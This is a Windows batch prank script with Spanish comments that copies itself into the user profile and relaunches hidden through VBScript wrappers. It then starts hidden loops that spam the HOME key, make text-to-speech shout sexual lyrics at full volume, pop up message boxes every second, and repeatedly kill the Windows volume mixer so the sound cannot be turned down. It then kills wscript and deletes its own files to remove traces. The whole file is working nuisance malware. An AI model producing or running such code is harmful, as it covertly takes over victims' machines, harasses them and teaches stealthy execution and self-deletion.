rem El volumen tiene que ir antes, calcular bien el tiempo
set /a elTimeOut = 0
set /a elTimeOutVol = 3
set /a elTimeParaAutodestruirse = 8
rem Si no ponemos un timeout con la duracion de la voz, al abrir varios se pierde el control
set /a elTimeEstimadoDeVoz = 0
set mensajeDeAviso=Estas bien?
set tituloDeAviso=Responde papu
rem el caracter ^ sirve para hacer multiplines strings
set laVoice=QUEEEEEEEEEEEEEDAAAATEEEEEEEEEEEEEEEEEEEE^
Que las noches sin ti duelen^
Tengo en la mente las pose^
Y todos los gemido^
Que ya no quiero nada^
Que no sea contigo
rem Esto significa que ya ha pasado por el :in asi que si no eliminamos no se ejecutara en formato oculto.vbs sino en bat
if exist %userprofile%/bromita/subirVolumen.vbs rmdir /s /q %userprofile%\bromita
md %userprofile%\bromita
copy LaEnfermedad.bat %userprofile%\bromita
IF EXIST %userprofile%\bromita\oculto.vbs goto in
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\LaEnfermedad.bat", 0, True >%userprofile%\bromita\oculto.vbs
start %userprofile%\bromita\oculto.vbs
exit
:in
rem Subir volumen al maximo vsb
echo set oShell = CreateObject("WScript.Shell") > %userprofile%\bromita\subirVolumen.vbs
echo oShell.run"%SystemRoot%\System32\SndVol.exe" >> %userprofile%\bromita\subirVolumen.vbs
echo WScript.Sleep 500 'Waits For The Program To Open >> %userprofile%\bromita\subirVolumen.vbs
echo oShell.SendKeys("{HOME}") >> %userprofile%\bromita\subirVolumen.vbs

rem Tecla Inicio
echo set oShell = CreateObject("WScript.Shell") > %userprofile%\bromita\teclaInicio.vbs
echo oShell.SendKeys("{HOME}") >> %userprofile%\bromita\teclaInicio.vbs
rem BUCLE bucleTeclaInicio.bat
echo :in > %userprofile%\bromita\bucleTeclaInicio.bat
echo start %userprofile%\bromita\teclaInicio.vbs >> %userprofile%\bromita\bucleTeclaInicio.bat
echo goto in >> %userprofile%\bromita\bucleTeclaInicio.bat
rem BUCLE ocultoBucleTeclaInicio.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\bucleTeclaInicio.bat", 0, True > %userprofile%\bromita\ocultoBucleTeclaInicio.vbs

rem Creacion de las voces
echo Option Explicit > %userprofile%\bromita\voice.vbs 
echo Dim David >> %userprofile%\bromita\voice.vbs 
echo 'David's Voice >> %userprofile%\bromita\voice.vbs 
echo Set David = CreateObject("SAPI.spVoice") >> %userprofile%\bromita\voice.vbs 
echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\bromita\voice.vbs 
echo David.Rate = 1 >> %userprofile%\bromita\voice.vbs 
echo David.Volume = 100 >> %userprofile%\bromita\voice.vbs 
echo David.Speak "%laVoice%" >> %userprofile%\bromita\voice.vbs
rem BUCLE bucleVoice.bat
echo :in > %userprofile%\bromita\bucleVoice.bat
echo start %userprofile%\bromita\voice.vbs >> %userprofile%\bromita\bucleVoice.bat
echo timeout %elTimeEstimadoDeVoz% >> %userprofile%\bromita\bucleVoice.bat
echo goto in >> %userprofile%\bromita\bucleVoice.bat
rem BUCLE ocultoBucleVoice.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\bucleVoice.bat", 0, True > %userprofile%\bromita\ocultoBucleVoice.vbs

rem AVISOS avisos.vbs 
echo resultado = MSGBOX ("%mensajeDeAviso%", VBYESNO, "%tituloDeAviso%") > %userprofile%\bromita\avisos.vbs 
rem ocultoBucleAvisos.bat de avisos.vbs
echo :in  > %userprofile%\bromita\ocultoBucleAvisos.bat 
echo start %userprofile%\bromita\avisos.vbs  >> %userprofile%\bromita\ocultoBucleAvisos.bat
echo timeout 1  >> %userprofile%\bromita\ocultoBucleAvisos.bat 
echo goto :in  >> %userprofile%\bromita\ocultoBucleAvisos.bat 
rem BUCLE VBS DE AVISOS ocultoBucleAvisos.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\ocultoBucleAvisos.bat", 0, True > %userprofile%\bromita\ocultoBucleAvisos.vbs

rem BAT buclekill.bat
echo :in > %userprofile%\bromita\buclekill.bat
echo taskkill /im SndVol.exe >> %userprofile%\bromita\buclekill.bat
echo goto :in >> %userprofile%\bromita\buclekill.bat
rem ocultoBucleKill.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\buclekill.bat", 0, True > %userprofile%\bromita\ocultoBucleKill.vbs

rem Iniciar programas
timeout %elTimeOut%
rem start %userprofile%\bromita\subirVolumen.vbs
rem timeout %elTimeOutVol%
start %userprofile%\bromita\ocultoBucleTeclaInicio.vbs
start %userprofile%\bromita\ocultoBucleVoice.vbs
start %userprofile%\bromita\ocultoBucleAvisos.vbs
start %userprofile%\bromita\ocultoBucleKill.vbs

rem Borrar todas las pruebas, falta un microdetalle pero por ahora sirve
timeout %elTimeParaAutodestruirse%
taskkill /im wscript.exe /f
rmdir /s /q %userprofile%\bromita
